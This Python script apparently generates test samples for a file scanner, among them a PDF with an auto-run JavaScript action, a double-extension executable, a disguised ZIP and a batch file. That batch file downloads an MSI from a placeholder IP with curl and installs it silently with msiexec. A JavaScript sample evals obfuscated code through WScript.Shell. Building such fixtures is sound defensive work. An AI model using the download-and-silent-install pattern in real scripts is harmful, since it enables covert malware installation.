import io
import os
import zipfile

OUT = "file_samples"


def make_zip(entries):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as z:
        for name, content in entries:
            z.writestr(name, content)
    return buffer.getvalue()


def mark_encrypted(data):
    data = bytearray(data)
    data[6] = data[6] | 1
    central = data.find(b"PK\x01\x02")
    data[central + 8] = data[central + 8] | 1
    return bytes(data)


PDF = (
    b"%PDF-1.4\n"
    b"1 0 obj\n"
    b"<< /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert\\(1\\)) >> >>\n"
    b"endobj\n"
    b"trailer\n"
    b"<< /Root 1 0 R >>\n"
    b"%%EOF\n"
)

BAT = (
    b"@echo off\n"
    b"curl http://198.51.100.23/setup.msi -o setup.msi\n"
    b"msiexec /i setup.msi /qn /norestart\n"
)

JS = (
    b'var shell = new ActiveXObject("WScript.Shell");\n'
    b'var code = unescape("%61%6c%65%72%74%28%31%29");\n'
    b"eval(code);\n"
)

FILES = {
    "notes.txt": b"Meeting notes. Nothing to see here.\n",
    "report.pdf": PDF,
    "invoice.pdf.exe": b"MZ" + b"\x00" * 58 + b"This is a harmless test file. It is not a program.\n",
    "holiday.jpg": make_zip([("hello.txt", b"hello")]),
    "install.bat": BAT,
    "script.js": JS,
    "budget.xlsm": make_zip([
        ("[Content_Types].xml", b"<Types/>"),
        ("xl/workbook.xml", b"<workbook/>"),
        ("xl/vbaProject.bin", b"fake macro data for testing"),
    ]),
    "locked.zip": mark_encrypted(make_zip([("secret.txt", b"fake secret")])),
    "bundle.zip": make_zip([
        ("readme.txt", b"hello"),
        ("setup.exe", b"MZ fake program for testing"),
    ]),
}


def main():
    os.makedirs(OUT, exist_ok=True)
    for name, data in FILES.items():
        with open(os.path.join(OUT, name), "wb") as f:
            f.write(data)
        print("created", name, len(data), "bytes")


if __name__ == "__main__":
    main()